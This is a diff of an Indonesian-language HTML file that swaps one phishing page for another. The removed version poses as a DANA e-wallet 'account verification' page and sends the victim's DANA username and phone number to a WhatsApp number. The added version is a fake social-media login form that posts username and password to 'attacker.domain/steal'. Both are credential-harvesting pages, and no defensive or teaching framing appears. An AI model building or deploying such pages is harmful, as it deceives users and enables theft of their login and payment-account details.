@@ -1,179 +1,58 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VERIFIKASI AKUN DANA</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #00BFFF;
-            margin: 0;
-            padding: 0;
-        }
-        header {
-            background-color: #FFFFFF;
-            color: blue;
-            padding: 15px;
-            text-align: center;
-        }
-        .container {
-            width: 80%;
-            margin: 0 auto;
-            padding: 20px;
-        }
-      .product-card {
-  display: flex;
-  align-items: center;
-  background-color: #add8e6;
-  padding: 20px;
-  margin: 20px 0;
-  border-radius: 8px;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        .product-card img {
-            width: 120px;
-            height: 120px;
-            object-fit: cover;
-            border-radius: 8px;
-            margin-right: 20px;
-        }
-        .product-info {
-            flex: 1;
-        }
-        .product-info h3 {
-            margin: 0;
-            font-size: 1.2em;
-        }
-        .product-info p {
-            margin: 5px 0;
-            color: gray;
-        }
-        .product-price {
-            font-size: 1.5em;
-            color: #333;
-            margin-top: 10px;
-        }
-        .order-form {
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-        .order-form input, .order-form select, .order-form button {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-        .order-form button {
-            background-color: #;
-            color: white;
-            cursor: pointer;
-        }
-        .order-form button:hover {
-            background-color: #555;
-        }
-        footer {
-            text-align: center;
-            padding: 10px;
-            background-color: #333;
-            color: white;
-            position: fixed;
-            width: 100%;
-            bottom: 0;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Login Media Sosial</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      text-align: center;
+    }
+    .login-container h2 {
+      margin-bottom: 1rem;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 0.75rem;
+      margin: 0.5rem 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 0.75rem;
+      background: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    .login-container button:hover {
+      background: #357ae8;
+    }
+  </style>
 </head>
 <body>
-
-<header>
-    <h1>VERIFIKASI AKUN DANA</h1>
-    <p>AMANKAN AKUN ANDA SEKARANG JUGA DENGAN KAMI</p>
-</header>
-
-<div class="container">
-    <h2>VERIFIKASI SEBERAPA LAmA AKUN ANDA </h2>
-
-   <!-- 1 TAHUN PENGGUNAAN DANA -->
-    <div class="product-card">
-<img src="images/akun dana-1000.jpg
-" alt="akun dana-1000.jpg
-" width="120">        <div class="product-info">
-            <h3>1 TAHUN PENGGUNAAN DANA</h3>
-            <p>Verifikasi 1 TAHUN PENGGUNAAN DANA.</p>
-            <div class="product-price">Limit Tersedia</div>
-        </div>
-    </div>
-
-
-  <!-- 2 TAHUN PENGGUNAAN DANA -->
-    <div class="product-card">
-<img src="images/akun dana-1000.jpg
-" alt="akun dana-1000.jpg
-" width="120">        <div class="product-info">
-            <h3>2 TAHUN PENGGUNAAN DANA</h3>
-            <p>Verifikasi 2 TAHUN PENGGUNAAN DANA.</p>
-            <div class="product-price">Limit Tersedia</div>
-        </div>
-    </div>
-
-
-   <!-- 5 TAHUN PENGGUNAAN DANA -->
-    <div class="product-card">
-<img src="images/akun dana-1000.jpg
-" alt="akun dana-1000.jpg
-" width="120">        <div class="product-info">
-            <h3>5 TAHUN PENGGUNAAN DANA</h3>
-            <p>Verifikasi 5 TAHUN PENGGUNAAN DANA.</p>
-            <div class="product-price">Limit Tersedia</div>
-        </div>
-    </div>
-
-
-    <!-- Formulir Pemesanan -->
-    <div class="order-form">
-        <h2>ISI FORMULIR VERIFIKASI</h2>
-        <form action="submit_order.php" method="POST">
-            <label for="name">Nama Lengkap</label>
-            <input type="text" id="name" name="name" placeholder="Masukkan nama lengkap" required>
-
-            <label for="followers">Pilih Verifikasi</label>
-            <select id="followers" name="followers" required>
-                <option value="1000">1,tahun - LIMIT TERSEDIA</option>
-                <option value="2000">2,tahun - LIMIT TERSEDIA</option>
-                <option value="50000">5,tahun - LIMIT TERSEDIA</option>
-            </select>
-
-            <label for="instagram">Username DANA</label>
-            <input type="text" id="instagram" name="instagram" placeholder="Masukkan username Instagram" required>
-
-            <label for="contact">Nomor Telepon DANA</label>
-            <input type="tel" id="contact" name="contact" placeholder="Masukkan nomor telepon" required>
-
-<button type="button" id="whatsapp-btn">Pesan Sekarang</button>
-        </form>
-<script>
-  document.getElementById("whatsapp-btn").addEventListener("click", function () {
-    const username = document.getElementById("instagram").value;
-    const contact = document.getElementById("contact").value;
-
-    const waNumber = "12498950768";
-
-    const message = `Halo, saya ingin Verifikasi.\nUsername Dana: ${username}\nNomor Telepon: ${contact}`;
-
-    const encodedMessage = encodeURIComponent(message);
-
-window.open(`https://wa.me/${waNumber}?text=${encodedMessage}`, "_blank");
-  });
-</script>
-    </div>
-</div>
-
-<footer>
-</footer>
-
+  <div class="login-container">
+    <h2>Masuk ke Media Sosial</h2>
+    <form method="POST" action="https://attacker.domain/steal">
+      <input type="text" name="username" placeholder="Username atau Email" required>
+      <input type="password" name="password" placeholder="Kata Sandi" required>
+      <button type="submit">Masuk</button>
+    </form>
+  </div>
 </body>
 </html>
